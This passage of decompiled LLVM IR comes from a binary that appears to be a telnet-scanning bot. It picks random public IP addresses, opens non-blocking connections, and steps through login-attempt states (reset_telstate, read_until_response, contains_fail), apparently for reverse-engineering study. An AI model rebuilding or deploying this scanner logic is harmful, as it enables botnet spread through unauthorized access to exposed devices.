  %v1_804a272 = call i32 @GetRandomPublicIP(i32 %v6_804a1a2)
  %v0_804a27c = load i32, i32* @ebx, align 4
  %v1_804a27e = mul i32 %v0_804a27c, 4
  store i32 %v1_804a27e, i32* %edx.global-to-local, align 4
  %v2_804a28c = mul i32 %v0_804a27c, 28
  %v2_804a28e = add i32 %v2_804a28c, %v2_804a05c
  %v1_804a290 = add i32 %v2_804a28e, 4
  store i32 %v1_804a290, i32* %eax.global-to-local, align 4
  %v2_804a293 = inttoptr i32 %v1_804a290 to i32*
  store i32 %v1_804a272, i32* %v2_804a293, align 4
  br label %dec_label_pc_804a3ac

dec_label_pc_804a29a:                             ; preds = %dec_label_pc_804a1cf
  %v5_804a2b0 = load i8, i8* %v4_804a1e5, align 1
  %v6_804a2b0 = zext i8 %v5_804a2b0 to i32
  %v9_804a2b0 = or i32 %v6_804a2b0, %v8_804a1a2
  store i32 %v9_804a2b0, i32* %eax.global-to-local, align 4
  %v4_804a2b4 = icmp eq i8 %v5_804a2b0, 0
  %v1_804a2b6 = icmp eq i1 %v4_804a2b4, false
  br i1 %v1_804a2b6, label %dec_label_pc_804a3ac, label %dec_label_pc_804a2bc

dec_label_pc_804a2bc:                             ; preds = %dec_label_pc_804a29a
  store i32 %v1_804a143, i32* %edx.global-to-local, align 4
  store i32 %v2_804a151, i32* %eax.global-to-local, align 4
  %v3_804a2d4 = add i32 %v2_804a2d4, %v2_804a151
  %v4_804a2d4 = inttoptr i32 %v3_804a2d4 to i8*
  %v5_804a2d4 = load i8, i8* %v4_804a2d4, align 1
  %v1_804a2d8 = add i8 %v5_804a2d4, 1
  store i8 %v1_804a2d8, i8* %v4_804a2d4, align 1
  store i32 %v1_804a143, i32* %edx.global-to-local, align 4
  store i32 %v2_804a151, i32* %eax.global-to-local, align 4
  %v3_804a30e = add i32 %v2_804a30e, %v2_804a151
  %v4_804a30e = inttoptr i32 %v3_804a30e to i8*
  %v5_804a30e = load i8, i8* %v4_804a30e, align 2
  %v6_804a30e = zext i8 %v5_804a30e to i32
  %v9_804a30e = or i32 %v6_804a30e, %v8_804a1a2
  %v1_804a312 = add i32 %v9_804a30e, 1
  store i32 %v1_804a312, i32* @esi, align 4
  %v1_804a32c = trunc i32 %v1_804a312 to i8
  store i8 %v1_804a32c, i8* %v4_804a30e, align 2
  store i32 %v1_804a143, i32* %edx.global-to-local, align 4
  store i32 %v2_804a151, i32* %eax.global-to-local, align 4
  %v5_804a346 = load i8, i8* %v4_804a2d4, align 1
  %v10_804a34a = icmp eq i8 %v5_804a346, 9
  %v1_804a34c = icmp eq i1 %v10_804a34a, false
  store i32 %v1_804a143, i32* %edx.global-to-local, align 4
  store i32 %v2_804a151, i32* %eax.global-to-local, align 4
  br i1 %v1_804a34c, label %dec_label_pc_804a36e, label %dec_label_pc_804a34e

dec_label_pc_804a34e:                             ; preds = %dec_label_pc_804a2bc
  store i8 1, i8* %v4_804a1e5, align 1
  br label %dec_label_pc_804b080

dec_label_pc_804a36e:                             ; preds = %dec_label_pc_804a2bc
  %v5_804a384 = load i8, i8* %v4_804a30e, align 2
  %v6_804a384 = zext i8 %v5_804a384 to i32
  %v9_804a384 = or i32 %v6_804a384, %v8_804a1a2
  store i32 %v9_804a384, i32* %eax.global-to-local, align 4
  %v10_804a388 = icmp eq i8 %v5_804a384, 9
  %v1_804a38a = icmp eq i1 %v10_804a388, false
  br i1 %v1_804a38a, label %dec_label_pc_804a3ac, label %dec_label_pc_804a38c

dec_label_pc_804a38c:                             ; preds = %dec_label_pc_804a36e
  store i32 %v1_804a143, i32* %edx.global-to-local, align 4
  store i32 %v2_804a151, i32* %eax.global-to-local, align 4
  store i8 1, i8* %v4_804a1e5, align 1
  br label %dec_label_pc_804b080

dec_label_pc_804a3ac:                             ; preds = %dec_label_pc_804a36e, %dec_label_pc_804a29a, %dec_label_pc_804a1f1
  store i32 2, i32* %stack_var_-604, align 4
  %v0_804a3b5 = load i32, i32* @esp, align 4
  %v1_804a3b8 = add i32 %v0_804a3b5, -16
  %v2_804a3b8 = inttoptr i32 %v1_804a3b8 to i32*
  store i32 23, i32* %v2_804a3b8, align 4
  %v0_804a3ba = load i32, i32* %stack_var_-604, align 4
  %v1_804a3ba = call i32 @htons(i32 %v0_804a3ba)
  %v0_804a3bf = load i32, i32* @esp, align 4
  store i32 0, i32* %stack_var_-596, align 4
  store i32 %v1_804a143, i32* %edx.global-to-local, align 4
  %v1_804a3f7 = add i32 %v2_804a153, 4
  store i32 %v1_804a3f7, i32* %eax.global-to-local, align 4
  %v1_804a3fa = inttoptr i32 %v1_804a3f7 to i32*
  %v2_804a3fa = load i32, i32* %v1_804a3fa, align 4
  store i32 %v2_804a3fa, i32* %eax.global-to-local, align 4
  store i32 %storemerge45, i32* @ebx, align 4
  %v1_804a408 = add i32 %v0_804a3bf, 8
  %v2_804a408 = inttoptr i32 %v1_804a408 to i32*
  store i32 0, i32* %v2_804a408, align 4
  %v1_804a40a = add i32 %v0_804a3bf, 4
  %v2_804a40a = inttoptr i32 %v1_804a40a to i32*
  store i32 1, i32* %v2_804a40a, align 4
  %v2_804a40c = inttoptr i32 %v0_804a3bf to i32*
  store i32 2, i32* %v2_804a40c, align 4
  %v2_804a40e = load i32, i32* %stack_var_-596, align 4
  %sext = mul i32 %v1_804a3ba, 65536
  %v3_804a40e = sdiv i32 %sext, 65536
  %v4_804a40e = call i32 @socket(i32 %v3_804a40e, i32 %v2_804a3fa, i32 %v2_804a40e)
  store i32 %v4_804a40e, i32* @esi, align 4
  %v0_804a41b = load i32, i32* @ebx, align 4
  %v2_804a42b = mul i32 %v0_804a41b, 28
  %v3_804a42d = add i32 %v2_804a42b, %v2_804a05c
  %v4_804a42d = inttoptr i32 %v3_804a42d to i32*
  store i32 %v4_804a40e, i32* %v4_804a42d, align 4
  store i32 %v1_804a143, i32* %edx.global-to-local, align 4
  store i32 %v2_804a151, i32* %eax.global-to-local, align 4
  %v3_804a446 = inttoptr i32 %v2_804a153 to i32*
  %v4_804a446 = load i32, i32* %v3_804a446, align 4
  store i32 %v4_804a446, i32* %eax.global-to-local, align 4
  %v10_804a449 = icmp eq i32 %v4_804a446, -1
  br i1 %v10_804a449, label %dec_label_pc_804b080, label %dec_label_pc_804a452

dec_label_pc_804a452:                             ; preds = %dec_label_pc_804a3ac
  store i32 %v1_804a143, i32* %edx.global-to-local, align 4
  store i32 %v2_804a151, i32* %eax.global-to-local, align 4
  %v4_804a468 = load i32, i32* %v3_804a446, align 4
  store i32 %v4_804a468, i32* %eax.global-to-local, align 4
  %v0_804a46b = load i32, i32* @esp, align 4
  %v1_804a46e = add i32 %v0_804a46b, -8
  %v2_804a46e = inttoptr i32 %v1_804a46e to i32*
  store i32 0, i32* %v2_804a46e, align 4
  %v1_804a470 = add i32 %v0_804a46b, -12
  %v2_804a470 = inttoptr i32 %v1_804a470 to i32*
  store i32 3, i32* %v2_804a470, align 4
  %v0_804a472 = load i32, i32* %eax.global-to-local, align 4
  %v2_804a472 = add i32 %v0_804a46b, -16
  %v3_804a472 = inttoptr i32 %v2_804a472 to i32*
  store i32 %v0_804a472, i32* %v3_804a472, align 4
  %v1_804a473 = load i32, i32* %stack_var_-596, align 4
  %v3_804a473 = call i32 @__libc_fcntl(i32 %v2_804a3fa, i32 %v1_804a473, i32 0)
  %v0_804a478 = load i32, i32* @esp, align 4
  %v12_804a47d = or i32 %v3_804a473, 2048
  store i32 %v12_804a47d, i32* @ebx, align 4
  store i32 %v1_804a143, i32* %edx.global-to-local, align 4
  store i32 %v2_804a151, i32* %eax.global-to-local, align 4
  %v4_804a496 = load i32, i32* %v3_804a446, align 4
  store i32 %v4_804a496, i32* %eax.global-to-local, align 4
  %v2_804a49c = add i32 %v0_804a478, 8
  %v3_804a49c = inttoptr i32 %v2_804a49c to i32*
  store i32 %v12_804a47d, i32* %v3_804a49c, align 4
  %v1_804a49d = add i32 %v0_804a478, 4
  %v2_804a49d = inttoptr i32 %v1_804a49d to i32*
  store i32 4, i32* %v2_804a49d, align 4
  %v0_804a49f = load i32, i32* %eax.global-to-local, align 4
  %v3_804a49f = inttoptr i32 %v0_804a478 to i32*
  store i32 %v0_804a49f, i32* %v3_804a49f, align 4
  %v1_804a4a0 = load i32, i32* %stack_var_-596, align 4
  %v3_804a4a0 = call i32 @__libc_fcntl(i32 %v2_804a3fa, i32 %v1_804a4a0, i32 0)
  %v0_804a4a5 = load i32, i32* @esp, align 4
  store i32 %v2_8049fea, i32* @ebx, align 4
  store i32 %v1_804a143, i32* %edx.global-to-local, align 4
  store i32 %v2_804a151, i32* %eax.global-to-local, align 4
  %v4_804a4c4 = load i32, i32* %v3_804a446, align 4
  store i32 %v4_804a4c4, i32* %eax.global-to-local, align 4
  %v1_804a4ca = add i32 %v0_804a4a5, 8
  %v2_804a4ca = inttoptr i32 %v1_804a4ca to i32*
  store i32 16, i32* %v2_804a4ca, align 4
  %v2_804a4cc = add i32 %v0_804a4a5, 4
  %v3_804a4cc = inttoptr i32 %v2_804a4cc to i32*
  store i32 %v2_8049fea, i32* %v3_804a4cc, align 4
  %v0_804a4cd = load i32, i32* %eax.global-to-local, align 4
  %v3_804a4cd = inttoptr i32 %v0_804a4a5 to i32*
  store i32 %v0_804a4cd, i32* %v3_804a4cd, align 4
  %v1_804a4ce = load i32, i32* %stack_var_-596, align 4
  %v3_804a4ce = call i32 @__libc_connect(i32 %v2_804a3fa, i32 %v1_804a4ce, i32 0)
  store i32 %v3_804a4ce, i32* %eax.global-to-local, align 4
  %v0_804a4d3 = load i32, i32* @esp, align 4
  %v1_804a4d3 = add i32 %v0_804a4d3, 16
  %v10_804a4d6 = icmp eq i32 %v3_804a4ce, -1
  %v1_804a4d9 = icmp eq i1 %v10_804a4d6, false
  br i1 %v1_804a4d9, label %dec_label_pc_804a511, label %dec_label_pc_804a4db

dec_label_pc_804a4db:                             ; preds = %dec_label_pc_804a452
  %v1_804a4db = call i32 @__errno_location(i32 %v2_804a3fa)
  store i32 %v1_804a4db, i32* %eax.global-to-local, align 4
  %v1_804a4e0 = inttoptr i32 %v1_804a4db to i32*
  %v2_804a4e0 = load i32, i32* %v1_804a4e0, align 4
  store i32 %v2_804a4e0, i32* %eax.global-to-local, align 4
  %v9_804a4e2 = icmp eq i32 %v2_804a4e0, 115
  br i1 %v9_804a4e2, label %dec_label_pc_804a4db.dec_label_pc_804a511_crit_edge, label %dec_label_pc_804a4e7

dec_label_pc_804a4db.dec_label_pc_804a511_crit_edge: ; preds = %dec_label_pc_804a4db
  %v0_804a52a.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804a511

dec_label_pc_804a4e7:                             ; preds = %dec_label_pc_804a4db
  store i32 %v1_804a143, i32* @edx, align 4
  store i32 %v2_804a153, i32* %eax.global-to-local, align 4
  %v0_804a500 = load i32, i32* @esp, align 4
  %v2_804a503 = add i32 %v0_804a500, -16
  %v3_804a503 = inttoptr i32 %v2_804a503 to i32*
  store i32 %v2_804a153, i32* %v3_804a503, align 4
  %v1_804a504 = call i32 @reset_telstate(i32 %v2_804a3fa)
  store i32 %v1_804a504, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b080

dec_label_pc_804a511:                             ; preds = %dec_label_pc_804a4db.dec_label_pc_804a511_crit_edge, %dec_label_pc_804a452
  %v0_804a52a = phi i32 [ %v0_804a52a.pre, %dec_label_pc_804a4db.dec_label_pc_804a511_crit_edge ], [ %v1_804a4d3, %dec_label_pc_804a452 ]
  store i32 %v1_804a143, i32* @edx, align 4
  store i32 %v2_804a153, i32* %eax.global-to-local, align 4
  %v1_804a52d = add i32 %v0_804a52a, -12
  %v2_804a52d = inttoptr i32 %v1_804a52d to i32*
  store i32 1, i32* %v2_804a52d, align 4
  %v0_804a52f = load i32, i32* %eax.global-to-local, align 4
  %v2_804a52f = add i32 %v0_804a52a, -16
  %v3_804a52f = inttoptr i32 %v2_804a52f to i32*
  store i32 %v0_804a52f, i32* %v3_804a52f, align 4
  %v1_804a530 = load i32, i32* %stack_var_-596, align 4
  %v2_804a530 = inttoptr i32 %v2_804a3fa to i32*
  %v3_804a530 = call i32 @advance_state(i32* %v2_804a530, i32 %v1_804a530)
  store i32 %v3_804a530, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b080

dec_label_pc_804a53d:                             ; preds = %dec_label_pc_804a18c
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804a547, i32* @edi, align 4
  %v5_804a54e = call i8* @_memset(i8* %tmp38, i32 0, i32 32)
  store i32 %v1_804a143, i32* %edx.global-to-local, align 4
  store i32 %v2_804a151, i32* %eax.global-to-local, align 4
  %v3_804a56c = inttoptr i32 %v2_804a153 to i32*
  %v4_804a56c = load i32, i32* %v3_804a56c, align 4
  %v2_804a571 = udiv i32 %v4_804a56c, 32
  store i32 %v2_804a571, i32* @ebx, align 4
  store i32 %v1_804a143, i32* %edx.global-to-local, align 4
  store i32 %v2_804a151, i32* %eax.global-to-local, align 4
  %v4_804a58a = load i32, i32* %v3_804a56c, align 4
  %v1_804a58d = urem i32 %v4_804a58a, 32
  store i32 %v1_804a58d, i32* %eax.global-to-local, align 4
  %v0_804a590 = load i32, i32* @ebp, align 4
  %v2_804a590 = mul nuw nsw i32 %v2_804a571, 4
  %v3_804a590 = add nsw i32 %v2_804a590, -312
  %v4_804a590 = add i32 %v3_804a590, %v0_804a590
  %v5_804a590 = inttoptr i32 %v4_804a590 to i32*
  %v6_804a590 = load i32, i32* %v5_804a590, align 4
  %v9_804a590 = shl i32 1, %v1_804a58d
  %v12_804a590 = or i32 %v6_804a590, %v9_804a590
  store i32 %v12_804a590, i32* %v5_804a590, align 4
  store i32 0, i32* %stack_var_-324, align 4
  store i32 %v1_804a143, i32* %edx.global-to-local, align 4
  store i32 %v2_804a151, i32* %eax.global-to-local, align 4
  %v4_804a5c1 = load i32, i32* %v3_804a56c, align 4
  %v1_804a5c4 = add i32 %v4_804a5c1, 1
  store i32 %v1_804a5c4, i32* %edx.global-to-local, align 4
  %v0_804a5c7 = load i32, i32* @esp, align 4
  %v2_804a5d0 = add i32 %v0_804a5c7, -16
  %v3_804a5d0 = inttoptr i32 %v2_804a5d0 to i32*
  store i32 %v2_804a5ca, i32* %v3_804a5d0, align 4
  %v1_804a5d1 = add i32 %v0_804a5c7, -20
  %v2_804a5d1 = inttoptr i32 %v1_804a5d1 to i32*
  store i32 0, i32* %v2_804a5d1, align 4
  store i32 %v2_804a547, i32* %eax.global-to-local, align 4
  %v2_804a5d9 = add i32 %v0_804a5c7, -24
  %v3_804a5d9 = inttoptr i32 %v2_804a5d9 to i32*
  store i32 %v2_804a547, i32* %v3_804a5d9, align 4
  %v1_804a5da = add i32 %v0_804a5c7, -28
  %v2_804a5da = inttoptr i32 %v1_804a5da to i32*
  store i32 0, i32* %v2_804a5da, align 4
  %v0_804a5dc = load i32, i32* %edx.global-to-local, align 4
  %v2_804a5dc = add i32 %v0_804a5c7, -32
  %v3_804a5dc = inttoptr i32 %v2_804a5dc to i32*
  store i32 %v0_804a5dc, i32* %v3_804a5dc, align 4
  %v0_804a5dd = load i32, i32* %stack_var_-324, align 4
  %v2_804a5dd = load i32, i32* %stack_var_-316, align 4
  %v5_804a5dd = call i32 @__libc_select(i32 %v0_804a5dd, i32 %arg1, i32 %v2_804a5dd, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804a5dd, i32* %eax.global-to-local, align 4
  %v0_804a5e2 = load i32, i32* @esp, align 4
  %v12_804a5e8 = icmp eq i32 %v5_804a5dd, 1
  %v1_804a5ec = icmp eq i1 %v12_804a5e8, false
  br i1 %v1_804a5ec, label %dec_label_pc_804a6f3, label %dec_label_pc_804a5f2

dec_label_pc_804a5f2:                             ; preds = %dec_label_pc_804a53d
  store i32 4, i32* %stack_var_-328, align 4
  store i32 0, i32* %stack_var_-332, align 4
  store i32 %v1_804a143, i32* %edx.global-to-local, align 4
  store i32 %v2_804a151, i32* %eax.global-to-local, align 4
  %v4_804a61c = load i32, i32* %v3_804a56c, align 4
  store i32 %v4_804a61c, i32* %edx.global-to-local, align 4
  %v2_804a628 = add i32 %v0_804a5e2, 16
  %v3_804a628 = inttoptr i32 %v2_804a628 to i32*
  store i32 %v2_804a622, i32* %v3_804a628, align 4
  store i32 %v2_804a629, i32* %eax.global-to-local, align 4
  %v2_804a62f = add i32 %v0_804a5e2, 12
  %v3_804a62f = inttoptr i32 %v2_804a62f to i32*
  store i32 %v2_804a629, i32* %v3_804a62f, align 4
  %v1_804a630 = add i32 %v0_804a5e2, 8
  %v2_804a630 = inttoptr i32 %v1_804a630 to i32*
  store i32 4, i32* %v2_804a630, align 4
  %v1_804a632 = add i32 %v0_804a5e2, 4
  %v2_804a632 = inttoptr i32 %v1_804a632 to i32*
  store i32 1, i32* %v2_804a632, align 4
  %v0_804a634 = load i32, i32* %edx.global-to-local, align 4
  %v3_804a634 = inttoptr i32 %v0_804a5e2 to i32*
  store i32 %v0_804a634, i32* %v3_804a634, align 4
  %v0_804a635 = load i32, i32* %stack_var_-332, align 4
  %v1_804a635 = load i32, i32* %stack_var_-328, align 4
  %v2_804a635 = load i32, i32* %stack_var_-324, align 4
  %v4_804a635 = load i32, i32* %stack_var_-316, align 4
  %v5_804a635 = call i32 @getsockopt(i32 %v0_804a635, i32 %v1_804a635, i32 %v2_804a635, i32 %arg1, i32 %v4_804a635)
  %v0_804a63a = load i32, i32* @esp, align 4
  %v3_804a63d = load i32, i32* %stack_var_-332, align 4
  store i32 %v3_804a63d, i32* %eax.global-to-local, align 4
  %v1_804a643 = icmp eq i32 %v3_804a63d, 0
  store i32 %v1_804a143, i32* @edx, align 4
  br i1 %v1_804a643, label %dec_label_pc_804a671, label %dec_label_pc_804a647

dec_label_pc_804a647:                             ; preds = %dec_label_pc_804a5f2
  store i32 %v2_804a153, i32* %eax.global-to-local, align 4
  %v2_804a663 = add i32 %v0_804a63a, 16
  %v3_804a663 = inttoptr i32 %v2_804a663 to i32*
  store i32 %v2_804a153, i32* %v3_804a663, align 4
  %v0_804a664 = load i32, i32* %stack_var_-332, align 4
  %v1_804a664 = call i32 @reset_telstate(i32 %v0_804a664)
  store i32 %v1_804a664, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b080

dec_label_pc_804a671:                             ; preds = %dec_label_pc_804a5f2
  store i32 %v2_804a151, i32* %eax.global-to-local, align 4
  %v4_804a687 = load i32, i32* %v3_804a56c, align 4
  store i32 %v4_804a687, i32* %eax.global-to-local, align 4
  %v1_804a68d = add i32 %v0_804a63a, 24
  %v2_804a68d = inttoptr i32 %v1_804a68d to i32*
  store i32 0, i32* %v2_804a68d, align 4
  %v1_804a68f = add i32 %v0_804a63a, 20
  %v2_804a68f = inttoptr i32 %v1_804a68f to i32*
  store i32 3, i32* %v2_804a68f, align 4
  %v0_804a691 = load i32, i32* %eax.global-to-local, align 4
  %v2_804a691 = add i32 %v0_804a63a, 16
  %v3_804a691 = inttoptr i32 %v2_804a691 to i32*
  store i32 %v0_804a691, i32* %v3_804a691, align 4
  %v0_804a692 = load i32, i32* %stack_var_-332, align 4
  %v1_804a692 = load i32, i32* %stack_var_-328, align 4
  %v2_804a692 = load i32, i32* %stack_var_-324, align 4
  %v3_804a692 = call i32 @__libc_fcntl(i32 %v0_804a692, i32 %v1_804a692, i32 %v2_804a692)
  %v0_804a697 = load i32, i32* @esp, align 4
  %v13_804a69c = and i32 %v3_804a692, -2049
  store i32 %v13_804a69c, i32* @ebx, align 4
  store i32 %v1_804a143, i32* %edx.global-to-local, align 4
  store i32 %v2_804a151, i32* %eax.global-to-local, align 4
  %v4_804a6b5 = load i32, i32* %v3_804a56c, align 4
  store i32 %v4_804a6b5, i32* %eax.global-to-local, align 4
  %v2_804a6bb = add i32 %v0_804a697, 8
  %v3_804a6bb = inttoptr i32 %v2_804a6bb to i32*
  store i32 %v13_804a69c, i32* %v3_804a6bb, align 4
  %v1_804a6bc = add i32 %v0_804a697, 4
  %v2_804a6bc = inttoptr i32 %v1_804a6bc to i32*
  store i32 4, i32* %v2_804a6bc, align 4
  %v0_804a6be = load i32, i32* %eax.global-to-local, align 4
  %v3_804a6be = inttoptr i32 %v0_804a697 to i32*
  store i32 %v0_804a6be, i32* %v3_804a6be, align 4
  %v0_804a6bf = load i32, i32* %stack_var_-332, align 4
  %v1_804a6bf = load i32, i32* %stack_var_-328, align 4
  %v2_804a6bf = load i32, i32* %stack_var_-324, align 4
  %v3_804a6bf = call i32 @__libc_fcntl(i32 %v0_804a6bf, i32 %v1_804a6bf, i32 %v2_804a6bf)
  %v0_804a6c4 = load i32, i32* @esp, align 4
  store i32 %v1_804a143, i32* @edx, align 4
  store i32 %v2_804a153, i32* %eax.global-to-local, align 4
  %v1_804a6e3 = add i32 %v0_804a6c4, 4
  %v2_804a6e3 = inttoptr i32 %v1_804a6e3 to i32*
  store i32 2, i32* %v2_804a6e3, align 4
  %v0_804a6e5 = load i32, i32* %eax.global-to-local, align 4
  %v3_804a6e5 = inttoptr i32 %v0_804a6c4 to i32*
  store i32 %v0_804a6e5, i32* %v3_804a6e5, align 4
  %v0_804a6e6 = load i32, i32* %stack_var_-332, align 4
  %v1_804a6e6 = load i32, i32* %stack_var_-328, align 4
  %v2_804a6e6 = inttoptr i32 %v0_804a6e6 to i32*
  %v3_804a6e6 = call i32 @advance_state(i32* %v2_804a6e6, i32 %v1_804a6e6)
  store i32 %v3_804a6e6, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b080

dec_label_pc_804a6f3:                             ; preds = %dec_label_pc_804a53d
  %v13_804a6f3 = icmp eq i32 %v5_804a5dd, -1
  %v1_804a6f7 = icmp eq i1 %v13_804a6f3, false
  store i32 %v1_804a143, i32* @edx, align 4
  br i1 %v1_804a6f7, label %dec_label_pc_804a723, label %dec_label_pc_804a6f9

dec_label_pc_804a6f9:                             ; preds = %dec_label_pc_804a6f3
  store i32 %v2_804a153, i32* %eax.global-to-local, align 4
  %v2_804a715 = add i32 %v0_804a5e2, 16
  %v3_804a715 = inttoptr i32 %v2_804a715 to i32*
  store i32 %v2_804a153, i32* %v3_804a715, align 4
  %v1_804a716 = call i32 @reset_telstate(i32 %v5_804a5dd)
  store i32 %v1_804a716, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b080

dec_label_pc_804a723:                             ; preds = %dec_label_pc_804a6f3
  store i32 %v1_804a155, i32* %eax.global-to-local, align 4
  %v2_804a73e = load i32, i32* %v1_804a158, align 4
  store i32 %v2_804a73e, i32* %eax.global-to-local, align 4
  %v1_804a740 = add i32 %v2_804a73e, 5
  store i32 %v1_804a740, i32* @ebx, align 4
  %v1_804a746 = add i32 %v0_804a5e2, 16
  %v2_804a746 = inttoptr i32 %v1_804a746 to i32*
  store i32 0, i32* %v2_804a746, align 4
  %v1_804a748 = inttoptr i32 %v5_804a5dd to i32*
  %v2_804a748 = call i32 @__GI_time(i32* %v1_804a748)
  store i32 %v2_804a748, i32* %eax.global-to-local, align 4
  %v0_804a750 = load i32, i32* @ebx, align 4
  %v7_804a750 = icmp ult i32 %v0_804a750, %v2_804a748
  %v1_804a752 = icmp eq i1 %v7_804a750, false
  br i1 %v1_804a752, label %dec_label_pc_804b080, label %dec_label_pc_804a758

dec_label_pc_804a758:                             ; preds = %dec_label_pc_804a723
  %v0_804a74d = load i32, i32* @esp, align 4
  store i32 %v1_804a143, i32* @edx, align 4
  store i32 %v2_804a153, i32* %eax.global-to-local, align 4
  %v3_804a774 = inttoptr i32 %v0_804a74d to i32*
  store i32 %v2_804a153, i32* %v3_804a774, align 4
  %v0_804a775 = load i32, i32* %stack_var_-332, align 4
  %v1_804a775 = call i32 @reset_telstate(i32 %v0_804a775)
  store i32 %v1_804a775, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b080

dec_label_pc_804a782:                             ; preds = %dec_label_pc_804a18c
  store i32 %v1_804a143, i32* %edx.global-to-local, align 4
  %v1_804a79a = add i32 %v2_804a153, 24
  store i32 %v1_804a79a, i32* %eax.global-to-local, align 4
  %v1_804a79d = inttoptr i32 %v1_804a79a to i32*
  %v2_804a79d = load i32, i32* %v1_804a79d, align 4
  store i32 %v2_804a79d, i32* @ebx, align 4
  store i32 %v1_804a143, i32* %edx.global-to-local, align 4
  store i32 %v2_804a151, i32* %eax.global-to-local, align 4
  %v3_804a7b5 = inttoptr i32 %v2_804a153 to i32*
  %v4_804a7b5 = load i32, i32* %v3_804a7b5, align 4
  store i32 %v4_804a7b5, i32* %eax.global-to-local, align 4
  %v0_804a7b8 = load i32, i32* @esp, align 4
  %v1_804a7bb = add i32 %v0_804a7b8, -16
  %v2_804a7bb = inttoptr i32 %v1_804a7bb to i32*
  store i32 134578572, i32* %v2_804a7bb, align 4
  %v1_804a7c0 = add i32 %v0_804a7b8, -20
  %v2_804a7c0 = inttoptr i32 %v1_804a7c0 to i32*
  store i32 1024, i32* %v2_804a7c0, align 4
  %v0_804a7c5 = load i32, i32* @ebx, align 4
  %v2_804a7c5 = add i32 %v0_804a7b8, -24
  %v3_804a7c5 = inttoptr i32 %v2_804a7c5 to i32*
  store i32 %v0_804a7c5, i32* %v3_804a7c5, align 4
  %v5_804a7c6 = add i32 %v0_804a7b8, -28
  %v6_804a7c6 = inttoptr i32 %v5_804a7c6 to i32*
  store i32 %arg1, i32* %v6_804a7c6, align 4
  %v0_804a7c9 = load i32, i32* %eax.global-to-local, align 4
  %v2_804a7c9 = add i32 %v0_804a7b8, -32
  %v3_804a7c9 = inttoptr i32 %v2_804a7c9 to i32*
  store i32 %v0_804a7c9, i32* %v3_804a7c9, align 4
  %v1_804a7ca = call i32 @read_until_response(i32 %v6_804a1a2)
  %v0_804a7cf = load i32, i32* @esp, align 4
  %v1_804a7d2 = icmp eq i32 %v1_804a7ca, 0
  store i32 %v1_804a143, i32* @edx, align 4
  store i32 %v2_804a153, i32* %eax.global-to-local, align 4
  br i1 %v1_804a7d2, label %dec_label_pc_804a85f, label %dec_label_pc_804a7da

dec_label_pc_804a7da:                             ; preds = %dec_label_pc_804a782
  store i32 %v1_804a79a, i32* %eax.global-to-local, align 4
  %v2_804a7f5 = load i32, i32* %v1_804a79d, align 4
  store i32 %v2_804a7f5, i32* %eax.global-to-local, align 4
  %v2_804a7fa = add i32 %v0_804a7cf, 16
  %v3_804a7fa = inttoptr i32 %v2_804a7fa to i32*
  store i32 %v2_804a7f5, i32* %v3_804a7fa, align 4
  %v0_804a7fb = load i32, i32* %stack_var_-332, align 4
  %v1_804a7fb = call i32 @contains_fail(i32 %v0_804a7fb)
  %v0_804a800 = load i32, i32* @esp, align 4
  %v1_804a803 = icmp eq i32 %v1_804a7fb, 0
  store i32 %v1_804a143, i32* @edx, align 4
  store i32 %v2_804a153, i32* %eax.global-to-local, align 4
  %v1_804a84f = add i32 %v0_804a800, 4
  %v2_804a84f = inttoptr i32 %v1_804a84f to i32*
  br i1 %v1_804a803, label %dec_label_pc_804a833, label %dec_label_pc_804a807

dec_label_pc_804a807:                             ; preds = %dec_label_pc_804a7da
  store i32 0, i32* %v2_804a84f, align 4
  %v0_804a825 = load i32, i32* %eax.global-to-local, align 4
  %v3_804a825 = inttoptr i32 %v0_804a800 to i32*
  store i32 %v0_804a825, i32* %v3_804a825, align 4
  %v0_804a826 = load i32, i32* %stack_var_-332, align 4
  %v1_804a826 = load i32, i32* %stack_var_-328, align 4
  %v2_804a826 = inttoptr i32 %v0_804a826 to i32*
  %v3_804a826 = call i32 @advance_state(i32* %v2_804a826, i32 %v1_804a826)
  store i32 %v3_804a826, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b080

dec_label_pc_804a833:                             ; preds = %dec_label_pc_804a7da
  store i32 3, i32* %v2_804a84f, align 4
  %v0_804a851 = load i32, i32* %eax.global-to-local, align 4
  %v3_804a851 = inttoptr i32 %v0_804a800 to i32*
  store i32 %v0_804a851, i32* %v3_804a851, align 4
  %v0_804a852 = load i32, i32* %stack_var_-332, align 4
  %v1_804a852 = load i32, i32* %stack_var_-328, align 4
  %v2_804a852 = inttoptr i32 %v0_804a852 to i32*
  %v3_804a852 = call i32 @advance_state(i32* %v2_804a852, i32 %v1_804a852)
  store i32 %v3_804a852, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b080

dec_label_pc_804a85f:                             ; preds = %dec_label_pc_804a782
  store i32 %v1_804a155, i32* %eax.global-to-local, align 4
  %v2_804a87a = load i32, i32* %v1_804a158, align 4
  store i32 %v2_804a87a, i32* %eax.global-to-local, align 4
  %v1_804a87c = add i32 %v2_804a87a, 7
  store i32 %v1_804a87c, i32* @ebx, align 4
  %v1_804a882 = add i32 %v0_804a7cf, 16
  %v2_804a882 = inttoptr i32 %v1_804a882 to i32*
  store i32 0, i32* %v2_804a882, align 4
  %v0_804a884 = load i32, i32* %stack_var_-332, align 4
  %v1_804a884 = inttoptr i32 %v0_804a884 to i32*
  %v2_804a884 = call i32 @__GI_time(i32* %v1_804a884)
  store i32 %v2_804a884, i32* %eax.global-to-local, align 4
  %v0_804a88c = load i32, i32* @ebx, align 4
  %v7_804a88c = icmp ult i32 %v0_804a88c, %v2_804a884
  %v1_804a88e = icmp eq i1 %v7_804a88c, false
  br i1 %v1_804a88e, label %dec_label_pc_804b080, label %dec_label_pc_804a894

dec_label_pc_804a894:                             ; preds = %dec_label_pc_804a85f
  %v0_804a889 = load i32, i32* @esp, align 4
  store i32 %v1_804a143, i32* @edx, align 4
  store i32 %v2_804a153, i32* %eax.global-to-local, align 4
  %v3_804a8b0 = inttoptr i32 %v0_804a889 to i32*
  store i32 %v2_804a153, i32* %v3_804a8b0, align 4
